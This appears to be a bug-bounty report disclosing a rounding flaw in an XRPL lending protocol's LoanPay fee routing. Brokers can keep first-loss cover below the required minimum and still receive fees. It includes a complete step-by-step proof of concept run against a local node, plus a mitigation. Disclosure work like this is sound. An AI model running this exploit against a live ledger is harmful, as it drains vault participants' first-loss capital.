# Title
LoanPay fee routing still pays broker while cover is below minimum due to rounding slack

# Description

## Brief/Intro
`LoanPay::doApply` decides whether borrower fees reinforce first-loss cover or are paid to the broker owner. The minimum cover check it uses is rounded with the current loan scale (`loanScale`) rather than the vault asset’s precision, so it rounds down whenever the aggregate debt exponent is coarse. A broker who keeps cover inside that rounding slack continues receiving fees even though real cover is below the mandated floor, draining first-loss capital from the vault.

## Vulnerability Details
- Vulnerable predicate:
  ```cpp
  bool const sendBrokerFeeToOwner = coverAvailableProxy >=
          roundToAsset(asset,
                       tenthBipsOfValue(
                           debtTotalProxy.value(), coverRateMinimum),
                       loanScale) &&
      !isDeepFrozen(view, brokerOwner, asset);
  ```
  (`src/xrpld/app/tx/detail/LoanPay.cpp:270-274`)
- `loanScale` is derived from `computeLoanProperties` and reflects the largest outstanding loan’s exponent (`src/xrpld/app/misc/detail/LendingHelpers.cpp:1364-1405`). With large loans, `Number::operator+=` shifts digits into that exponent (`src/libxrpl/basics/Number.cpp:245-360`), so `roundToAsset(..., loanScale)` operates in very coarse steps (e.g., 10⁶).
- When the true minimum cover lies between two coarse steps, rounding drops it to the lower value. A malicious broker keeps `sfCoverAvailable` slightly below the true floor but above the rounded one; the predicate still returns true and fees go to the owner instead of reinforcing cover.

## Impact Details
- Each borrower payment credits fees to the broker owner while cover remains below `DebtTotal × CoverRateMinimum`.
- Vault participants lose the FLC they expect, matching “Drainage and/or stealing of funds from ledger objects (vault, first loss capital).”
- Repeated payments drain the pool by hundreds of thousands of units before any default is processed.

## References
- LoanPay predicate: <https://github.com/immunefi-team/attackathon-xrpl-lending-protocol/blob/main/src/xrpld/app/tx/detail/LoanPay.cpp#L270-L274>
- Loan scale derivation: <https://github.com/immunefi-team/attackathon-xrpl-lending-protocol/blob/main/src/xrpld/app/misc/detail/LendingHelpers.cpp#L1364-L1405>
- `Number` rounding semantics: <https://github.com/immunefi-team/attackathon-xrpl-lending-protocol/blob/main/src/libxrpl/basics/Number.cpp#L33-L46>
- `STAmount` canonicalisation: <https://github.com/immunefi-team/attackathon-xrpl-lending-protocol/blob/main/src/libxrpl/protocol/STAmount.cpp#L1513-L1535>

## Proof of Concept

### Stand-alone node + JSON-RPC transactions

1. **Start the node**
   ```bash
   ./rippled -a --start --conf rippled.cfg
   ```
   Keep it running in a separate terminal.

2. **Derive deterministic wallets (issuer, broker owner, borrower)**
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"wallet_propose",
     "params":[{"passphrase":"issuer fee-routing poc"}]
   }' | tee issuer_wallet.json

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"wallet_propose",
     "params":[{"passphrase":"broker fee-routing poc"}]
   }' | tee broker_wallet.json

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"wallet_propose",
     "params":[{"passphrase":"borrower fee-routing poc"}]
   }' | tee borrower_wallet.json
   ```
   Extract accounts/secrets:
   ```bash
   ISSUER_ACCOUNT=$(jq -r '.result.account_id' issuer_wallet.json)
   ISSUER_SECRET=$(jq -r '.result.master_seed' issuer_wallet.json)
   BROKER_ACCOUNT=$(jq -r '.result.account_id' broker_wallet.json)
   BROKER_SECRET=$(jq -r '.result.master_seed' broker_wallet.json)
   BORROWER_ACCOUNT=$(jq -r '.result.account_id' borrower_wallet.json)
   BORROWER_SECRET=$(jq -r '.result.master_seed' borrower_wallet.json)
   ```

3. **Fund the three accounts from genesis**
   ```bash
   for acct in "$ISSUER_ACCOUNT" "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT"; do
     curl -s -X POST http://127.0.0.1:5005 -d "{
       \"method\":\"submit\",
       \"params\":[{
         \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",
         \"tx_json\":{
           \"TransactionType\":\"Payment\",
           \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",
           \"Destination\":\"$acct\",
           \"Amount\":\"100000000000\"
         }
       }]
     }" | jq '.result.engine_result'
   done
   ```

4. **Broker trustline + high-precision IOU issuance**
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BROKER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"TrustSet\",
         \"Account\":\"$BROKER_ACCOUNT\",
         \"LimitAmount\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\",
           \"value\":\"1000000000000000000\"
         },
         \"Flags\":262144
       }
     }]
   }" | jq '.result.engine_result'

   curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$ISSUER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"Payment\",
         \"Account\":\"$ISSUER_ACCOUNT\",
         \"Destination\":\"$BROKER_ACCOUNT\",
         \"Amount\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\",
           \"value\":\"1500000000000000000000000\"
         },
         \"Flags\":131072
       }
     }]
   }" | jq '.result.engine_result'
   ```

5. **Create vault with scale = 12 and record `VaultID`**
   ```bash
   VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BROKER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"VaultCreate\",
         \"Account\":\"$BROKER_ACCOUNT\",
         \"Asset\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\"
         },
         \"Scale\":12
       }
     }]
   }" | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"tx\",
     \"params\":[{\"transaction\":\"$VAULT_HASH\"}]
   }" | jq -r '.result.meta.AffectedNodes[]
       | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault")
       .CreatedNode.LedgerIndex')
   ```

6. **Create LoanBroker with minimal cover requirement**
   ```bash
   BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BROKER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"LoanBrokerSet\",
         \"Account\":\"$BROKER_ACCOUNT\",
         \"VaultID\":\"$VAULT_ID\",
         \"CoverRateMinimum\":1
       }
     }]
   }" | jq -r '.result.tx_json.hash')

   LOANBROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"tx\",
     \"params\":[{\"transaction\":\"$BROKER_HASH\"}]
   }" | jq -r '.result.meta.AffectedNodes[]
       | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker")
       .CreatedNode.LedgerIndex')
   ```

7. **Deposit cover and originate large loan to inflate `loanScale`**
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BROKER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"LoanBrokerCoverDeposit\",
         \"Account\":\"$BROKER_ACCOUNT\",
         \"LoanBrokerID\":\"$LOANBROKER_ID\",
         \"Amount\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\",
           \"value\":\"10000020000000000000000\"
         }
       }
     }]
   }" | jq '.result.engine_result'
   ```

   Use a `Batch` transaction to submit a large `LoanSet` (loan scale ≥ 6). Recommended workflow:
   1. Prepare JSON for the loan inner transaction (principal ≈ `1e18`, borrower counterparty, `tfInnerBatchTxn`) and for a zero-amount filler payment.
   2. Sign each inner transaction offline using `rippled sign --offline` (and add the borrower’s signature via `rippled sign_for` if required). Record the resulting `tx_blob` strings.
   3. Submit the Batch with those blobs supplied as `RawTransactions`, e.g.:
      ```bash
      curl -s -X POST http://127.0.0.1:5005 -d "{
        "method":"submit",
        "params":[{
          "secret":"$BROKER_SECRET",
          "tx_json":{
            "TransactionType":"Batch",
            "Account":"$BROKER_ACCOUNT",
            "Sequence":$BROKER_SEQ,
            "Fee":"$((3 * BASE_FEE))",
            "Flags":0,
            "RawTransactions":[
              {"RawTransaction":"$INNER_LOAN_BLOB"},
              {"RawTransaction":"$FILLER_BLOB"}
            ]
          }
        }]
      }" | tee batch_submit_response.json | jq '.result.engine_result'
      ```

   Extract the created loan’s ledger index:
   ```bash
   BATCH_HASH=$(jq -r '.result.tx_json.hash' batch_submit_response.json)
   LOAN_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
     "method":"tx",
     "params":[{"transaction":"$BATCH_HASH"}]
   }" | jq -r '.result.meta.AffectedNodes[]
       | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Loan")
       .CreatedNode.LedgerIndex')
   ```
   After the batch succeeds, inspect the broker ledger entry to confirm `sfDebtTotal` has the desired exponent:
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d "{
     "method":"ledger_entry",
     "params":[{"index":"$LOANBROKER_ID"}]
   }" | jq '.result.node | {CoverAvailable:."CoverAvailable", DebtTotal:."DebtTotal"}'
   ```


8. **Move cover into the rounding gap**
   Withdraw just enough to leave cover below the true minimum but above the rounded minimum. Example:
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BROKER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"LoanBrokerCoverWithdraw\",
         \"Account\":\"$BROKER_ACCOUNT\",
         \"LoanBrokerID\":\"$LOANBROKER_ID\",
         \"Amount\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\",
           \"value\":\"200000\"
         }
       }
     }]
   }" | jq '.result.engine_result'
   ```
   Repeat in small amounts until `CoverAvailable` is just below the analytic minimum but still ≥ rounded minimum.

9. **Submit `LoanPay` and observe mis-routing**
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d "{
     \"method\":\"submit\",
     \"params\":[{
       \"secret\":\"$BORROWER_SECRET\",
       \"tx_json\":{
         \"TransactionType\":\"LoanPay\",
         \"Account\":\"$BORROWER_ACCOUNT\",
         \"LoanID\":\"$LOAN_ID\",
         \"Amount\":{
           \"currency\":\"USD\",
           \"issuer\":\"$ISSUER_ACCOUNT\",
           \"value\":\"1000000\"
         }
       }
     }]
   }" | jq '.result.engine_result'
   ```

10. **Verify ledger state**
    ```bash
    curl -s -X POST http://127.0.0.1:5005 -d "{
      \"method\":\"ledger_entry\",
      \"params\":[{
        \"index\":\"$LOANBROKER_ID\"
      }]
    }" | tee after_broker.json | jq '.result.node'

    curl -s -X POST http://127.0.0.1:5005 -d "{
      \"method\":\"account_lines\",
      \"params\":[{
        \"account\":\"$BROKER_ACCOUNT\",
        \"peer\":\"$ISSUER_ACCOUNT\"
      }]
    }" | tee broker_lines.json
    ```
    Compute:
    ```bash
    TRUE_MIN=$(python3 - <<'PY'
    import json, decimal
    data=json.load(open("after_broker.json"))
    debt=decimal.Decimal(data["result"]["node"]["DebtTotal"]["value"])
    cover_rate=decimal.Decimal(data["result"]["node"]["CoverRateMinimum"])
    print(debt * cover_rate / decimal.Decimal(100000))
PY
    )

    COV=$(python3 - <<'PY'
    import json, decimal
    data=json.load(open("after_broker.json"))
    print(decimal.Decimal(data["result"]["node"]["CoverAvailable"]["value"]))
PY
    )

    echo "True minimum cover: $TRUE_MIN"
    echo "Cover available:    $COV"
    ```
    Confirm:
    - `COV < TRUE_MIN`
    - `COV >=` rounded minimum (inspect the value used in step 7).
    - Broker owner’s balance increased by the fee amount (`account_lines`).
    - `sfCoverAvailable` unchanged by the payment.


## Recommended Mitigation
- Compute the minimum with vault asset precision (e.g., `NumberRoundModeGuard guard(Number::upward); roundToAsset(..., Number::upward)`) so cover never rounds down below the true floor.
- Centralise minimum cover logic and reuse in withdraw, fee routing, and default flows.
